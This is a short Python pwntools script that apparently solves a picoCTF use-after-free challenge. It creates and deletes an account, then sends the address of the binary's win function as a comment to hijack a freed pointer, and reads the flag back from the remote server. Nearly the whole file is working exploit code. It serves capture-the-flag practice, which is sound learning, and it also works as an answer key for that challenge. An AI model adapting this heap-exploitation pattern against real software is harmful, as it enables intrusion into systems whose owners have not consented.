#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
local = False
GDBSCPT = '''
b* doProcess
c
'''
#context.log_level="debug"

if local:
    conn = elf.process()
    gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = 'mercury.picoctf.net'
    port = 50361
    conn = remote(host,port)

def CreateAccount():
	conn.sendline(b"M")
	conn.recvuntil(b"Enter your username: ")
	conn.sendline(b"pwner")

def DeleteAccount():
	conn.sendline(b"I")
	conn.recvuntil(b"You're leaving already(Y/N)?")
	conn.sendline(b"Y")

def LeaveComment(paylod):
	conn.sendline(b"l")
	conn.recvuntil(b"try anyways:")
	conn.sendline(paylod)

def Exit():
	conn.sendline(b"e")
	
WIN = elf.symbols["hahaexploitgobrrr"]
log.info(f"WIN @ {hex(WIN)}")

log.info("Creating an account")
CreateAccount()
log.info("Deleting the account")
DeleteAccount()
log.info("Leaving a comment")
LeaveComment(p32(WIN))
conn.recvline()

log.info(f"flag: {conn.recvline().decode()}")
Exit()

conn.close()
